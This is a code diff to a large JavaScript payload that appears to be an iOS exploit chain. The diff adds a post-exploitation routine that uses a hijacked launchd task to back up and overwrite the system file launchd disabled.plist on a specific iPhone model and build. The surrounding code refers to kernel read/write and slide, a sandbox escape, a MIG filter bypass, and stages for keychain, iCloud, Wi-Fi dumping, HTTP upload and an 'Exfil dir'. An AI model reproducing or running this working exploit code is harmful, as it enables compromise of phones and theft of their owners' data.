@@ -1,5 +1,5 @@
 (() => {
-  const LS_PE_PAYLOAD_REVISION = "20260904.8";
+  const LS_PE_PAYLOAD_REVISION = "20260904.9";
   const PE_ENABLE_DEBUG_NETWORK = globalThis.__pe_enable_debug_network === true;
   const LS_RETAIN_KRW_FOR_VISIBLE_TEST = false;
   const PE_A18_SCAN_BUDGET_MS = 120000;
@@ -9778,6 +9778,7 @@ const POWERCUFF_TWEAK_PATH = "/powercuff_light.js";
 const POWERCUFF_TWEAK_LABEL = "Powercuff";
 const ENABLE_MGPATCHER = !!globalThis.__ls_enable_mgpatcher;
 const ENABLE_OTA_DISABLED_EXPORT = globalThis.__ls_export_ota_disabled === true;
+const ENABLE_DISABLED_PLIST_RESTORE = globalThis.__ls_restore_disabled_plist === true;
 const MG_FLAGS = (typeof globalThis.__mg_flags === 'string') ? globalThis.__mg_flags : '';
 const MG_UNFLAGS = (typeof globalThis.__mg_unflags === 'string') ? globalThis.__mg_unflags : '';
 const ENABLE_APPLIMIT_REQUESTED = !!globalThis.__ls_enable_applimit;
@@ -10009,7 +10010,7 @@ function stashKRWToLaunchd(launchdTask) {
 let chainStatusLogReady = false;
 let chainStatusBuffer = [];
 let chainStatusLastLine = "";
-const CHAIN_STATUS_FILTER_RE = /\[PE(?:-[A-Z0-9]+)*\]|\[KRW(?:-[A-Z0-9]+)*\]|\[OTA-EXPORT\]|\[SBX1\]|\[SBC\]|\[POWERCUFF\]|\[FILE-DL\]|\[FILE-DL-EARLY\]|\[HTTP-UPLOAD\]|\[APP\]|\[ICLOUD\]|\[KEYCHAIN\]|\[WIFI\]|\[THREEAPP\]|\[THREEAPP-AUDIT\]|\[SAFARI-CLEAN\]|\[MG\]|\[MPD\]|\[APPLIMIT\]|nativeCallBuff|kernel_base|kernel_slide|SBX0|SBX1|sbx0:|sbx1:|MIG_FILTER_BYPASS |INJECTJS |CHAIN |DRIVER-POSTEXPL |DRIVER-NEWTHREAD |DARKSWORD-WIFI-DUMP |INFO |OFFSETS |FILE-UTILS |PORTRIGHTINSERTER |REGISTERSSTRUCT |REMOTECALL |TASK(?:ROP)? |THREAD |VM |MAIN |EXCEPTION |SANDBOX |PAC (?:diagnostics|ptrs|gadget)|UTILS |^\[[+\-!i]\]\s/i;
+const CHAIN_STATUS_FILTER_RE = /\[PE(?:-[A-Z0-9]+)*\]|\[KRW(?:-[A-Z0-9]+)*\]|\[OTA-EXPORT\]|\[PLIST-RESTORE\]|\[SBX1\]|\[SBC\]|\[POWERCUFF\]|\[FILE-DL\]|\[FILE-DL-EARLY\]|\[HTTP-UPLOAD\]|\[APP\]|\[ICLOUD\]|\[KEYCHAIN\]|\[WIFI\]|\[THREEAPP\]|\[THREEAPP-AUDIT\]|\[SAFARI-CLEAN\]|\[MG\]|\[MPD\]|\[APPLIMIT\]|nativeCallBuff|kernel_base|kernel_slide|SBX0|SBX1|sbx0:|sbx1:|MIG_FILTER_BYPASS |INJECTJS |CHAIN |DRIVER-POSTEXPL |DRIVER-NEWTHREAD |DARKSWORD-WIFI-DUMP |INFO |OFFSETS |FILE-UTILS |PORTRIGHTINSERTER |REGISTERSSTRUCT |REMOTECALL |TASK(?:ROP)? |THREAD |VM |MAIN |EXCEPTION |SANDBOX |PAC (?:diagnostics|ptrs|gadget)|UTILS |^\[[+\-!i]\]\s/i;
 const chainStatusOriginalLog = LOG;
 LOG = function(msg) {
 	try { chainStatusRecord(msg); } catch (_) {}
@@ -10524,6 +10525,280 @@ function exportOriginalOTADisabledPlist(launchdTask) {
 		if (remoteBuffer && remoteBuffer !== 0n && launchdTask) launchdTask.call(10, "free", remoteBuffer);
 		if (sourceBuffer && sourceBuffer !== 0n) Native.callSymbol("free", sourceBuffer);
 		if (verifyBuffer && verifyBuffer !== 0n) Native.callSymbol("free", verifyBuffer);
+	}
+}
+
+function restoreStockDisabledPlist(launchdTask) {
+	const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
+	const sourceDir = "/private/var/db/com.apple.xpc.launchd";
+	const sourcePath = sourceDir + "/disabled.plist";
+	const backupDir = "/private/var/mobile/Media/Downloads/";
+	const expectedModel = "iPhone17,2";
+	const expectedBuild = "22G100";
+	const expectedSha256 = "d3af907cf4d0d8008ffc3f86f0049026cc097145ac9132f1e5b08aa412871c9e";
+	const stockBase64 = "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHBsaXN0IFBVQkxJQyAiLS8vQXBwbGUvL0RURCBQTElTVCAxLjAvL0VOIiAiaHR0cDovL3d3dy5hcHBsZS5jb20vRFREcy9Qcm9wZXJ0eUxpc3QtMS4wLmR0ZCI+CjxwbGlzdCB2ZXJzaW9uPSIxLjAiPgo8ZGljdD4KCTxrZXk+Y29tLmFwcGxlLk9UQVRhc2tpbmdBZ2VudDwva2V5PgoJPHRydWUvPgoJPGtleT5jb20uYXBwbGUuYWNjZXNzaWJpbGl0eS5heEF1ZGl0RGFlbW9uLmRldmljZXNlcnZpY2U8L2tleT4KCTxmYWxzZS8+Cgk8a2V5PmNvbS5hcHBsZS5ib290cGQ8L2tleT4KCTx0cnVlLz4KCTxrZXk+Y29tLmFwcGxlLmRoY3A2ZDwva2V5PgoJPHRydWUvPgoJPGtleT5jb20uYXBwbGUuZHQuVmlld0hpZXJhcmNoeUFnZW50PC9rZXk+Cgk8ZmFsc2UvPgoJPGtleT5jb20uYXBwbGUuZnRwLXByb3h5LWVtYmVkZGVkPC9rZXk+Cgk8ZmFsc2UvPgoJPGtleT5jb20uYXBwbGUuZ3B1dG9vbHNzZXJ2aWNlZDwva2V5PgoJPGZhbHNlLz4KCTxrZXk+Y29tLmFwcGxlLmluc3RydW1lbnRzLmRldmljZXNlcnZpY2U8L2tleT4KCTxmYWxzZS8+Cgk8a2V5PmNvbS5hcHBsZS5tYWdpY3N3aXRjaGQuY29tcGFuaW9uPC9rZXk+Cgk8dHJ1ZS8+Cgk8a2V5PmNvbS5hcHBsZS5tb2JpbGUuTlJEVXBkYXRlZDwva2V5PgoJPHRydWUvPgoJPGtleT5jb20uYXBwbGUubW9iaWxlLnNvZnR3YXJldXBkYXRlZDwva2V5PgoJPHRydWUvPgoJPGtleT5jb20uYXBwbGUuc2VjdXJpdHkub3RwYWlyZDwva2V5PgoJPHRydWUvPgoJPGtleT5jb20uYXBwbGUuc29mdHdhcmV1cGRhdGVzZXJ2aWNlc2Q8L2tleT4KCTx0cnVlLz4KCTxrZXk+Y29tLmFwcGxlLnN5c21vbmQ8L2tleT4KCTxmYWxzZS8+CjwvZGljdD4KPC9wbGlzdD4K";
+	const expectedStockSize = 897;
+	const maxSourceSize = 4 * 1024 * 1024;
+	const O_RDONLY_NOFOLLOW = 0x100n;
+	const O_WRONLY_CREATE_EXCL_NOFOLLOW = 0xb01n;
+	const COPYFILE_METADATA = 0x7n;
+	let sourceFd = -1;
+	let backupFd = -1;
+	let stageFd = -1;
+	let remotePathBuffer = 0n;
+	let remoteOriginalBuffer = 0n;
+	let remoteStockBuffer = 0n;
+	let remoteVerifyBuffer = 0n;
+	let localStockBuffer = 0n;
+	let backupPath = backupDir + "disabled.plist.pre-restore." + Date.now();
+	let stagePath = sourceDir + "/.disabled.plist.lightsaber." + Date.now() + ".tmp";
+	let backupCreated = false;
+	let backupVerified = false;
+	let stageCreated = false;
+	let sourceReplaced = false;
+
+	function decodeBase64(input) {
+		const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+		let outputLength = Math.floor(input.length * 3 / 4) - (input.endsWith("==") ? 2 : (input.endsWith("=") ? 1 : 0));
+		let output = new Uint8Array(outputLength);
+		let accumulator = 0;
+		let bits = 0;
+		let offset = 0;
+		for (let i = 0; i < input.length; i++) {
+			let value = alphabet.indexOf(input.charAt(i));
+			if (value < 0) continue;
+			accumulator = (accumulator << 6) | value;
+			bits += 6;
+			if (bits >= 8) {
+				bits -= 8;
+				if (offset < output.length) output[offset++] = (accumulator >> bits) & 0xff;
+			}
+		}
+		return output;
+	}
+
+	function remoteErrno() {
+		try {
+			let errnoPtr = launchdTask.call(10, "__error");
+			if (!errnoPtr || !launchdTask.read(errnoPtr, Native.mem, 4)) return -1;
+			return Native.read32(Native.mem);
+		} catch (_) {
+			return -1;
+		}
+	}
+
+	function logResult(result, extra) {
+		LOG("[PLIST-RESTORE] result=" + result + (extra ? " " + extra : "") +
+			" source=" + sourcePath + " backup=" + backupPath + " stage=" + stagePath +
+			" stock_sha256=" + expectedSha256);
+	}
+
+	function remoteWriteFully(fd, buffer, size) {
+		let total = 0;
+		while (total < size) {
+			let chunkSize = Math.min(size - total, 32768);
+			let amount = Number(launchdTask.call(1000, "write", fd, buffer + BigInt(total), BigInt(chunkSize)));
+			if (amount <= 0) break;
+			total += amount;
+		}
+		return total;
+	}
+
+	function remoteReadFully(fd, buffer, size) {
+		let total = 0;
+		while (total < size) {
+			let chunkSize = Math.min(size - total, 32768);
+			let amount = Number(launchdTask.call(1000, "read", fd, buffer + BigInt(total), BigInt(chunkSize)));
+			if (amount <= 0) break;
+			total += amount;
+		}
+		return total;
+	}
+
+	function verifyRemoteFile(pathPointer, expectedBuffer, expectedSize, label) {
+		let fd = launchdTask.call(1000, "open", pathPointer, O_RDONLY_NOFOLLOW);
+		if (Number(fd) < 0) {
+			logResult(label + "-verify-open-failed", "errno=" + remoteErrno() + " bytes=0 expected=" + expectedSize);
+			return false;
+		}
+		try {
+			let actualSize = Number(launchdTask.call(1000, "lseek", fd, 0n, 2n));
+			if (actualSize !== expectedSize || Number(launchdTask.call(1000, "lseek", fd, 0n, 0n)) !== 0) {
+				logResult(label + "-verify-size-failed", "bytes=" + actualSize + " expected=" + expectedSize + " errno=" + remoteErrno());
+				return false;
+			}
+			let bytesRead = remoteReadFully(fd, remoteVerifyBuffer, expectedSize);
+			let compareResult = bytesRead === expectedSize ? Number(launchdTask.call(1000, "memcmp", expectedBuffer, remoteVerifyBuffer, BigInt(expectedSize))) : -1;
+			if (bytesRead !== expectedSize || compareResult !== 0) {
+				logResult(label + "-verify-content-failed", "bytes=" + bytesRead + " expected=" + expectedSize + " compare=" + compareResult);
+				return false;
+			}
+			return true;
+		} finally {
+			launchdTask.call(1000, "close", fd);
+		}
+	}
+
+	LOG("[PLIST-RESTORE] source=" + sourcePath);
+	LOG("[PLIST-RESTORE] backup=" + backupPath);
+	LOG("[PLIST-RESTORE] stock bytes=" + expectedStockSize + " sha256=" + expectedSha256 + " target=" + expectedModel + "/" + expectedBuild);
+
+	try {
+		let identity = {};
+		try { identity = mpd_krw_current_identity() || {}; } catch (_) {}
+		if (identity.model !== expectedModel || identity.build !== expectedBuild) {
+			logResult("unsupported-target", "model=" + (identity.model || "unknown") + " build=" + (identity.build || "unknown") +
+				" expected_model=" + expectedModel + " expected_build=" + expectedBuild + " bytes=0");
+			return false;
+		}
+		if (!launchdTask || !launchdTask.success()) {
+			logResult("launchd-task-unavailable", "bytes=0");
+			return false;
+		}
+
+		let stockBytes = decodeBase64(stockBase64);
+		if (stockBytes.byteLength !== expectedStockSize) {
+			logResult("embedded-stock-invalid", "bytes=" + stockBytes.byteLength + " expected=" + expectedStockSize);
+			return false;
+		}
+		localStockBuffer = Native.callSymbol("malloc", BigInt(expectedStockSize));
+		if (!localStockBuffer) {
+			logResult("local-stock-buffer-failed", "bytes=0");
+			return false;
+		}
+		Native.write(localStockBuffer, stockBytes.buffer);
+
+		remotePathBuffer = launchdTask.call(1000, "malloc", 4096n);
+		remoteStockBuffer = launchdTask.call(1000, "malloc", BigInt(expectedStockSize));
+		if (!remotePathBuffer || !remoteStockBuffer || !launchdTask.write(remoteStockBuffer, localStockBuffer, expectedStockSize)) {
+			logResult("remote-stock-buffer-failed", "bytes=0");
+			return false;
+		}
+		let sourcePathPointer = remotePathBuffer;
+		let backupPathPointer = remotePathBuffer + 512n;
+		let stagePathPointer = remotePathBuffer + 1024n;
+		let sourceDirPointer = remotePathBuffer + 1536n;
+		if (!launchdTask.writeStr(sourcePathPointer, sourcePath) ||
+			!launchdTask.writeStr(backupPathPointer, backupPath) ||
+			!launchdTask.writeStr(stagePathPointer, stagePath) ||
+			!launchdTask.writeStr(sourceDirPointer, sourceDir)) {
+			logResult("path-buffer-failed", "bytes=0");
+			return false;
+		}
+
+		sourceFd = launchdTask.call(1000, "open", sourcePathPointer, O_RDONLY_NOFOLLOW);
+		if (Number(sourceFd) < 0) {
+			let openErrno = remoteErrno();
+			logResult(openErrno === 2 ? "missing" : "source-open-failed", "errno=" + openErrno + " bytes=0");
+			return false;
+		}
+		let sourceSize = Number(launchdTask.call(1000, "lseek", sourceFd, 0n, 2n));
+		if (sourceSize < 0) {
+			logResult("source-size-failed", "errno=" + remoteErrno() + " bytes=0");
+			return false;
+		}
+		if (sourceSize === 0) {
+			logResult("empty", "bytes=0");
+			return false;
+		}
+		if (sourceSize > maxSourceSize) {
+			logResult("source-too-large", "bytes=" + sourceSize + " limit=" + maxSourceSize);
+			return false;
+		}
+		if (Number(launchdTask.call(1000, "lseek", sourceFd, 0n, 0n)) !== 0) {
+			logResult("source-seek-failed", "errno=" + remoteErrno() + " bytes=0");
+			return false;
+		}
+
+		remoteOriginalBuffer = launchdTask.call(1000, "malloc", BigInt(sourceSize));
+		remoteVerifyBuffer = launchdTask.call(1000, "malloc", BigInt(Math.max(sourceSize, expectedStockSize)));
+		if (!remoteOriginalBuffer || !remoteVerifyBuffer) {
+			logResult("remote-verify-buffer-failed", "bytes=0");
+			return false;
+		}
+		let sourceBytes = remoteReadFully(sourceFd, remoteOriginalBuffer, sourceSize);
+		if (sourceBytes !== sourceSize) {
+			logResult("source-short-read", "bytes=" + sourceBytes + " expected=" + sourceSize + " errno=" + remoteErrno());
+			return false;
+		}
+		if (sourceSize === expectedStockSize && Number(launchdTask.call(1000, "memcmp", remoteOriginalBuffer, remoteStockBuffer, BigInt(expectedStockSize))) === 0) {
+			logResult("already-stock", "bytes=" + expectedStockSize + " backup=not-created");
+			return true;
+		}
+
+		backupFd = launchdTask.call(1000, "open", backupPathPointer, O_WRONLY_CREATE_EXCL_NOFOLLOW, 0o644n);
+		if (Number(backupFd) < 0) {
+			logResult("backup-open-failed", "errno=" + remoteErrno() + " bytes=0");
+			return false;
+		}
+		backupCreated = true;
+		let backupBytes = remoteWriteFully(backupFd, remoteOriginalBuffer, sourceSize);
+		if (backupBytes !== sourceSize || Number(launchdTask.call(1000, "fsync", backupFd)) !== 0) {
+			logResult("backup-write-failed", "bytes=" + backupBytes + " expected=" + sourceSize + " errno=" + remoteErrno());
+			return false;
+		}
+		launchdTask.call(1000, "close", backupFd);
+		backupFd = -1;
+		if (!verifyRemoteFile(backupPathPointer, remoteOriginalBuffer, sourceSize, "backup")) return false;
+		backupVerified = true;
+		LOG("[PLIST-RESTORE] backup-verified bytes=" + sourceSize + " path=" + backupPath);
+
+		stageFd = launchdTask.call(1000, "open", stagePathPointer, O_WRONLY_CREATE_EXCL_NOFOLLOW, 0o600n);
+		if (Number(stageFd) < 0) {
+			logResult("stage-open-failed", "errno=" + remoteErrno() + " bytes=0");
+			return false;
+		}
+		stageCreated = true;
+		let stageBytes = remoteWriteFully(stageFd, remoteStockBuffer, expectedStockSize);
+		if (stageBytes !== expectedStockSize || Number(launchdTask.call(1000, "fsync", stageFd)) !== 0) {
+			logResult("stage-write-failed", "bytes=" + stageBytes + " expected=" + expectedStockSize + " errno=" + remoteErrno());
+			return false;
+		}
+		if (Number(launchdTask.call(1000, "fcopyfile", sourceFd, stageFd, 0n, COPYFILE_METADATA)) !== 0) {
+			logResult("stage-metadata-failed", "errno=" + remoteErrno() + " bytes=" + stageBytes);
+			return false;
+		}
+		if (Number(launchdTask.call(1000, "fsync", stageFd)) !== 0) {
+			logResult("stage-fsync-failed", "errno=" + remoteErrno() + " bytes=" + stageBytes);
+			return false;
+		}
+		launchdTask.call(1000, "close", stageFd);
+		stageFd = -1;
+		if (!verifyRemoteFile(stagePathPointer, remoteStockBuffer, expectedStockSize, "stage")) return false;
+
+		launchdTask.call(1000, "close", sourceFd);
+		sourceFd = -1;
+		if (Number(launchdTask.call(1000, "rename", stagePathPointer, sourcePathPointer)) !== 0) {
+			logResult("rename-failed", "errno=" + remoteErrno() + " bytes=0");
+			return false;
+		}
+		sourceReplaced = true;
+		stageCreated = false;
+
+		let directoryFd = launchdTask.call(1000, "open", sourceDirPointer, 0n);
+		if (Number(directoryFd) >= 0) {
+			let directorySync = Number(launchdTask.call(1000, "fsync", directoryFd));
+			launchdTask.call(1000, "close", directoryFd);
+			if (directorySync !== 0) LOG("[PLIST-RESTORE] warning=directory-fsync-failed errno=" + remoteErrno() + " path=" + sourceDir);
+		}
+
+		if (!verifyRemoteFile(sourcePathPointer, remoteStockBuffer, expectedStockSize, "final")) return false;
+		logResult("success", "bytes=" + expectedStockSize + " previous_bytes=" + sourceSize + " backup_verified=1");
+		return true;
+	} catch (e) {
+		logResult("exception", "bytes=0 error=" + String(e).replace(/\s+/g, " "));
+		return false;
+	} finally {
+		if (Number(sourceFd) >= 0 && launchdTask) try { launchdTask.call(1000, "close", sourceFd); } catch (_) {}
+		if (Number(backupFd) >= 0 && launchdTask) try { launchdTask.call(1000, "close", backupFd); } catch (_) {}
+		if (Number(stageFd) >= 0 && launchdTask) try { launchdTask.call(1000, "close", stageFd); } catch (_) {}
+		if (launchdTask && stageCreated && !sourceReplaced && remotePathBuffer) try { launchdTask.call(1000, "unlink", remotePathBuffer + 1024n); } catch (_) {}
+		if (launchdTask && backupCreated && !backupVerified && remotePathBuffer) try { launchdTask.call(1000, "unlink", remotePathBuffer + 512n); } catch (_) {}
+		if (launchdTask && remoteOriginalBuffer) try { launchdTask.call(1000, "free", remoteOriginalBuffer); } catch (_) {}
+		if (launchdTask && remoteStockBuffer) try { launchdTask.call(1000, "free", remoteStockBuffer); } catch (_) {}
+		if (launchdTask && remoteVerifyBuffer) try { launchdTask.call(1000, "free", remoteVerifyBuffer); } catch (_) {}
+		if (launchdTask && remotePathBuffer) try { launchdTask.call(1000, "free", remotePathBuffer); } catch (_) {}
+		if (localStockBuffer) try { Native.callSymbol("free", localStockBuffer); } catch (_) {}
 	}
 }
 
@@ -11515,8 +11790,15 @@ function start() {
 	LOG("[PE] Exfil dir: " + filzaDst);
 		LOG("[PE] Chain status overlay log: " + CHAIN_STATUS_LOG_PATH);
 		phaseEnd("Media dir prep");
-		let otaExportResult = runOptionalStage("OTA disabled.plist read-only export", ENABLE_OTA_DISABLED_EXPORT, () => exportOriginalOTADisabledPlist(launchdTask));
-		if (ENABLE_OTA_DISABLED_EXPORT) LOG("[PE] OTA disabled.plist read-only export result=" + (otaExportResult ? "success" : "failed"));
+		if (ENABLE_OTA_DISABLED_EXPORT && ENABLE_DISABLED_PLIST_RESTORE) {
+			LOG("[OTA-EXPORT] result=conflicting-actions bytes=0");
+			LOG("[PLIST-RESTORE] result=conflicting-actions bytes=0");
+		} else {
+			let otaExportResult = runOptionalStage("OTA disabled.plist read-only export", ENABLE_OTA_DISABLED_EXPORT, () => exportOriginalOTADisabledPlist(launchdTask));
+			if (ENABLE_OTA_DISABLED_EXPORT) LOG("[PE] OTA disabled.plist read-only export result=" + (otaExportResult ? "success" : "failed"));
+			let plistRestoreResult = runOptionalStage("disabled.plist stock restore", ENABLE_DISABLED_PLIST_RESTORE, () => restoreStockDisabledPlist(launchdTask));
+			if (ENABLE_DISABLED_PLIST_RESTORE) LOG("[PE] disabled.plist stock restore result=" + (plistRestoreResult ? "success" : "failed"));
+		}
 
 		phaseStart("Safari clean+kill");
 	let safariCleanOk = runOptionalStage("Safari origin cleanup audit", ENABLE_SAFARI_ORIGIN_AUDIT, auditSafariOriginData);
